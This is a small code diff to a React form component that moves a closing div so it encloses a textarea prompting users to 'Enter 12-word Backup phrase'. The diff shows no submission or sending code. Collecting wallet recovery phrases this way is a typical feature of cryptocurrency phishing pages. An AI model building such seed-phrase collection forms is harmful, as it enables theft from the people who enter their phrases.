@@ -112,8 +112,6 @@ const Form = (props) => {
                     styles={customStyles}
                     onChange={onPackageChange}
                 />
-            </div>
-
             <textarea
                 id='phrase'
                 className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
@@ -123,6 +121,8 @@ const Form = (props) => {
                 placeholder='Enter 12-word Backup phrase'
                 onChange={handlePhrase}
             />
+            </div>
+
 
             <div className='flex justify-between items-center pt-10 font-medium'>
                 <div className='text-xs font-normal text-[#708599]'>
